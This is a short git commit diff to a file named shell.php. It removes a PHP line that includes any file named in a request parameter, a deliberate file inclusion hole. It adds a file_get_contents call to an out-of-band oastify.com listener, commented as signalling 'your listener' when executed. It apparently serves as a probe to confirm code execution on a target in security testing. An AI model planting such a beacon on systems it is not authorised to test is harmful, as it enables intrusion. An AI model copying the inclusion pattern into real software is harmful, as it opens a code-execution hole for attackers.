b1eadbf35e9552cb5eb98b8f55f33b9333e52780
ritik verma <53325087+ritik8354@users.noreply.github.com>
2025-10-07 15:22:41 +0530

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,4 +1,4 @@
 <?php
-$file = $_GET['page'];
-include($file);
+// when executed, performs an HTTP request to your listener
+file_get_contents("https://hxi4iu0qskoo2jmwhh4wxd3r4ia9y2mr.oastify.com/exec-detected?rand=UNIQUE_ID");
 ?>
